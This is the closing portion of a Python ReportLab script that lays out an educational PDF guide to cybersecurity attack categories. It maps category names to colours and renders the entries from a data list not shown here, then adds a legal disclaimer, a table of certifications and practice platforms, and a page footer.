    "CLIENT-SIDE ATTACKS": C_RED,
    "INJECTION ATTACKS": C_ORANGE,
    "AUTHENTICATION ATTACKS": C_YELLOW,
    "ACCESS CONTROL ATTACKS": C_GREEN,
    "FILE RELATED ATTACKS": C_BLUE,
    "NETWORK ATTACKS": C_PURPLE,
    "API ATTACKS": C_ORANGE,
    "CLOUD & INFRASTRUCTURE": C_RED,
    "WIRELESS ATTACKS": C_BLUE,
    "MOBILE APPLICATION ATTACKS": C_GREEN,
    "THICK CLIENT ATTACKS": C_YELLOW,
    "ACTIVE DIRECTORY ATTACKS": C_RED,
    "OWASP TOP 10": C_ORANGE,
}

for cat_title, cat_color, cat_icon, cat_attacks in attacks:
    accent = CAT_ACCENT_MAP.get(cat_title, C_RED)
    story.append(section_header(cat_title, cat_color, cat_icon))
    story.append(sp(0.2))
    for a in cat_attacks:
        block = attack_block(
            num=a["num"], title=a["title"],
            severity=a["severity"],
            definition=a["definition"],
            simple_explain=a["simple_explain"],
            example=a["example"],
            poc_code=a["poc_code"],
            prevention=a["prevention"],
            sub_attacks=a.get("sub_attacks"),
            accent=accent,
        )
        for item in block:
            story.append(item)
    story.append(PageBreak())

# ── FINAL PAGE ────────────────────────────────────────────────────────────────
story.append(sp(2))
story.append(ColorBox(C_BG_CARD, 2*cm,
    "🔒  ALWAYS HACK ETHICALLY & LEGALLY",
    text_color=C_GREEN, font_size=16))
story.append(sp(0.5))
disclaimer_text = """
<b>LEGAL DISCLAIMER:</b> This document is intended solely for educational purposes and 
authorised security testing. Always obtain explicit written permission before testing 
any system you do not own. Unauthorised access to computer systems is a criminal offence 
under the Computer Fraud and Abuse Act (CFAA), Computer Misuse Act, and equivalent laws 
worldwide. The authors and publishers accept no liability for misuse of this information.
"""
story.append(Paragraph(disclaimer_text, ParagraphStyle("disc", fontSize=9,
    textColor=C_LIGHT, fontName="Helvetica", leading=14, alignment=TA_JUSTIFY)))
story.append(sp(0.5))

cert_table_data = [
    ["Recommended Certifications", "Practice Platforms"],
    ["CEH - Certified Ethical Hacker", "HackTheBox (hackthebox.com)"],
    ["OSCP - Offensive Security Certified Professional", "TryHackMe (tryhackme.com)"],
    ["eJPT - Junior Penetration Tester", "VulnHub (vulnhub.com)"],
    ["CompTIA Security+", "PentesterLab (pentesterlab.com)"],
    ["CISSP - Security Professional", "PortSwigger Web Academy (portswigger.net/web-security)"],
]
ct = Table(cert_table_data, colWidths=[8.5*cm, 8.5*cm])
ct.setStyle(TableStyle([
    ("BACKGROUND", (0,0), (-1,0), C_RED),
    ("BACKGROUND", (0,1), (-1,-1), C_BG_CARD),
    ("TEXTCOLOR", (0,0), (-1,-1), C_WHITE),
    ("FONTNAME", (0,0), (-1,0), "Helvetica-Bold"),
    ("FONTNAME", (0,1), (-1,-1), "Helvetica"),
    ("FONTSIZE", (0,0), (-1,-1), 9),
    ("ALIGN", (0,0), (-1,-1), "LEFT"),
    ("VALIGN", (0,0), (-1,-1), "MIDDLE"),
    ("LEFTPADDING", (0,0), (-1,-1), 8),
    ("ROWHEIGHT", (0,0), (-1,-1), 0.6*cm),
    ("GRID", (0,0), (-1,-1), 0.5, C_GRAY),
]))
story.append(ct)

# Page number footer helper
def add_page_number(canvas, doc):
    canvas.saveState()
    canvas.setFont("Helvetica", 8)
    canvas.setFillColor(C_GRAY)
    canvas.drawCentredString(W/2, 1*cm,
        f"Cybersecurity Attacks Complete Guide  |  Page {doc.page}  |  For Educational Use Only")
    canvas.restoreState()

doc.build(story, onFirstPage=add_page_number, onLaterPages=add_page_number)
print("PDF created successfully!")